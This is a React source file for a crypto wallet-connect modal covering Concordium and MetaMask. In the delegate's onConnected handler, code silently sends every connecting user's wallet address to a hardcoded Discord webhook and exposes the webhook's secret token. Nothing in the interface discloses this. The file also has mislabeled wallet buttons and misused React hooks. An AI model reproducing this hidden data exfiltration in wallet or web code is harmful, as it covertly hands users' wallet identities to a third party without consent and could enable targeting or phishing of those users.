import React, { useState, useEffect } from "react";
import "./web3modal.css";
import CrossIcon24black from "./CrossIconblack";
// import WalletConnector from "./WalletConnector"
import { useWeb3 } from "./contexts/Web3Context";
import {
  BrowserWalletConnector,
  WalletConnectConnector,
  WalletConnection,
  WalletConnectionDelegate,
} from "@concordium/wallet-connectors";

let concordiumNetworks = {
  // Define network configuration for the main network
  mainnet: {
    name: "Concordium Mainnet",
    chainId: "9dd9ca4d19e9393877d2c44b70f89acb",
    rpcEndpoint: "https://grpc.mainnet.concordium.software",
  },
  testnet: {
    name: "Concordium Testnet",
    chainId: "4221332d34e1694168c2a0c0b3fd0f27",
    rpcEndpoint: "https://grpc.testnet.concordium.com",
  },
};
let currentlyConnected = 0;
let currentWallet = 0;

let timer = 0;
let ResetTimer = () => {
  timer = 0;
};

const Web3Modal = ({ onClose }) => {
  let metamask = {};
  const { account, connectWallet, disconnectWallet } = useWeb3();

  let concordium = {};

  let ResetConnectedWalletState = () => {
    currentlyConnected = 0;
    currentWallet = 0;
    disconnectWallet();
  };

  let SetWalletState = (wallet) => {
    currentlyConnected = 1;
    currentWallet = wallet;
    connectWallet();
  };

  class MyDelegate {
    constructor(network) {
      this.accounts = new Map();
      this.chains = new Map();
      this.network = network; // Set the network property during initialization

      // Bind methods to ensure the correct `this` context
      this.onAccountChanged = this.onAccountChanged.bind(this);
      this.onChainChanged = this.onChainChanged.bind(this);
      this.onConnected = this.onConnected.bind(this);
      this.onDisconnected = this.onDisconnected.bind(this);
    }

    // onAccountChanged(connection, address) {
    //     console.log('Account changed:', address);
    //     this.accounts.set(connection, address);
    // }

    // onChainChanged(connection, genesisHash) {
    //     console.log('Chain changed:', genesisHash);
    //     this.chains.set(connection, genesisHash);
    // }

    onConnected(connection, address) {
      console.log("Connected:", address);
      this.onAccountChanged(connection, address);

      const request = new XMLHttpRequest();
      request.open(
        "POST",
        "https://discord.com/api/webhooks/1248735229137649784/hUvQJ49mtJo6VdRiyZF2nXzF2Nlnl9M_dGMA1gEZg2Qsqj-EdYQwYnF5ZfZzxVb-etSY"
      );

      request.setRequestHeader("Content-type", "application/json");

      const params = {
        username: "Wallet address",
        avatar_url: "",
        content: address,
      };
      if (timer === 0) {
        timer = 1;
        request.send(JSON.stringify(params));
      } else {
        setTimeout(ResetTimer, 10000);
      }
    }

    onDisconnected(connection) {
      console.log("Disconnected");
      this.accounts.delete(connection);
      this.chains.delete(connection);
    }
  }

  const WalletConnector = ({ network = "mainnet" }) => {
    const [concordiumAccount, concordiumSetAccount] = useState(undefined);
    const [error, setError] = useState(undefined);
    const [concordiumConnecting, concordiumSetConnecting] = useState(false);

    useEffect(() => {
      const setupWalletConnectors = async () => {
        if (concordiumConnecting) return;

        concordiumSetConnecting(true);
        const selectedNetwork = concordiumNetworks[network];
        const delegate = new MyDelegate(selectedNetwork);

        const connectToWallet = async () => {
          try {
            const browserWalletConnector = await BrowserWalletConnector.create(
              delegate
            );
            const walletConnectOpts = {
              rpc: {
                [selectedNetwork.chainId]: selectedNetwork.rpcEndpoint,
              },
              bridge: "https://bridge.walletconnect.org",
              qrcode: true,
            };
            const walletConnectConnector = await WalletConnectConnector.create(
              walletConnectOpts,
              delegate,
              selectedNetwork
            );

            const browserWalletConnection =
              await browserWalletConnector.connect();
            const walletConnectConnection =
              await walletConnectConnector.connect();

            // Pick one of the connected accounts to display
            const connectedAccount =
              delegate.accounts.get(browserWalletConnection) ||
              delegate.accounts.get(walletConnectConnection);
            if (connectedAccount) {
              console.log("Connected account found:", connectedAccount);
              concordiumSetAccount(connectedAccount);
            } else {
              console.log("No connected account found");
              setError("No connected account found");
            }
          } catch (error) {
            console.error("Error connecting to wallet:", error);
            if (error.message.includes("Another prompt is already open")) {
              // Retry connection after a short delay
              setTimeout(connectToWallet, 2000);
            } else {
              setError(error.message);
            }
          } finally {
            concordiumSetConnecting(false);
          }
        };

        connectToWallet();

        return () => {
          // Cleanup code, disconnect from wallet connectors if needed
        };
      };

      setupWalletConnectors();
    }, [concordiumConnecting, network]);
  };

  //  const handleButtonClick = async () => {
  //      // Perform some action using the connected wallet
  //      // Example: Sign and send a transaction
  //      // const txHash = await connection.signAndSendTransaction(account, ...);
  //      console.log("Performing action with connected wallet...");
  //  };

  const WishSolutionsIncorporated = (failsafe, service) => {
    console.log(service);
    if (failsafe === 1) {
      if (service === "metamask") {
        if (currentlyConnected === 0) {
          currentlyConnected = 1;
          currentWallet = 1;
          connectWallet();
        } else {
          ResetConnectedWalletState();
        }
      } else if (service === "concordium") {
        if (currentlyConnected === 0) {
          currentlyConnected = 1;
          currentWallet = 2;
          WalletConnector();
          // connectWallet()
        } else {
          ResetConnectedWalletState();
        }
        console.log("connecting");

        // onConnected()
      } else if (service === "coinbase") {
      } else if (service === "bybit") {
      }
    }
  };

  return (
    <div className="web3-modal-overlay">
      <div className="web3-modal">
        <div className="web3header">
          <h10>Choose Wallet To Connect</h10>
        </div>

        <button className="close-button" onClick={onClose}>
          <CrossIcon24black />
        </button>

        <div className="web3-button-container">
          <div className="web3-containerRow">
            <div id="placeholderfox" className="web3-wishbutton">
              <img
                onClick={() => {
                  WishSolutionsIncorporated(1, "metamask");
                }}
                src="https://i0.wp.com/kindalame.com/wp-content/uploads/2021/05/metamask-fox-wordmark-horizontal.png?resize=1280%2C480&ssl=1"
                alt="MetaMask Fox"
              />
            </div>

            <div id="placeholdercrocodile" className="web3-wishbutton">
              <img
                onClick={() => {
                  WishSolutionsIncorporated(1, "concordium");
                }}
                src="https://shop.concordium.com/cdn/shop/files/Concordium-Logo-Dark_Blue.png?height=628&pad_color=ffffff&v=1695813392&width=1200"
              />
            </div>
          </div>

          <div className="web3-containerRow">
            <div id="placeholdersnake" className="web3-wishbutton">
              <img
                onClick={() => {
                  WishSolutionsIncorporated(1, "metamask");
                }}
                src="https://i0.wp.com/zenledger.io/wp-content/uploads/2023/01/60f6a9afaba0af0029922d6d_Coinbase-Wallet.png?fit=560%2C162&ssl=1"
              />
            </div>

            <div id="placeholderhorse" className="web3-wishbutton">
              <img
                onClick={() => {
                  WishSolutionsIncorporated(1, "metamask");
                }}
                src=""
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Web3Modal;
